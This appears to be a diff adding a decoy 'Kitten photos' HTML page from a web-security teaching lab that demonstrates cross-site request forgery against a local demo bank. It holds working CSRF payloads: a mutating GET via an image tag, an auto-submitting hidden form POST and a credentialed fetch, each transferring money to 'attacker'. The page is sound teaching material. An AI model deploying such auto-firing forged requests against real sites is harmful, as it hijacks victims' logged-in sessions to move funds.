@@ -1,0 +1,60 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Kitten photos!</title>
+  <link rel="stylesheet" href="/shared/lab.css">
+  <style>
+    body { padding: 14px; background: #1a0f14; }
+    h2 { color: #ff7b72; margin: 0 0 6px; }
+  </style>
+</head>
+<body>
+  <h2>😻 Free kitten photos</h2>
+  <p class="hint">
+    This page is served from a <strong>different site</strong> (<code>127.0.0.1:8081</code>).
+    It has no access to the bank's cookies, cannot read the bank's responses, and does not need
+    either — it only needs your browser to <em>send</em> the request.
+  </p>
+
+  <p class="hint" id="what">Nothing has happened yet.</p>
+
+  <!-- Attack 1: a GET that mutates. An <img> is enough — no JavaScript required. -->
+  <img id="getAttack" width="1" height="1" alt="">
+
+  <!-- Attack 2: an auto-submitting cross-site form POST. Forms are exempt from CORS preflight
+       for these content types, which is exactly why they are the classic CSRF vector. -->
+  <form id="postAttack" method="POST" target="sink"
+        action="http://localhost:8080/api/csrf?action=transfer">
+    <input type="hidden" name="to" value="attacker">
+    <input type="hidden" name="amount" value="250">
+  </form>
+  <iframe name="sink" style="display:none"></iframe>
+
+  <script>
+    const params = new URLSearchParams(location.search);
+    const mode = params.get('attack') || 'post';
+    const what = document.getElementById('what');
+
+    if (mode === 'get') {
+      // No JS needed in the real thing: <img src="…"> in an email or a forum post does it.
+      document.getElementById('getAttack').src =
+        'http://localhost:8080/api/csrf?action=transfer&to=attacker&amount=250&via=img';
+      what.textContent = 'Fired a GET via <img src>. No JavaScript, no form, no user action.';
+    } else if (mode === 'fetch') {
+      // fetch() with credentials is the ONE vector CORS actually helps with — and even then the
+      // request is often sent; CORS only stops the attacker READING the response.
+      fetch('http://localhost:8080/api/csrf?action=transfer', {
+        method: 'POST', credentials: 'include',
+        headers: { 'content-type': 'application/x-www-form-urlencoded' },
+        body: 'to=attacker&amount=250',
+      }).then(() => { what.textContent = 'fetch resolved'; })
+        .catch((e) => { what.textContent = 'fetch was blocked by CORS: ' + e.message; });
+      what.textContent = 'Fired a credentialed cross-origin fetch().';
+    } else {
+      document.getElementById('postAttack').submit();
+      what.textContent = 'Auto-submitted a cross-site form POST.';
+    }
+  </script>
+</body>
+</html>
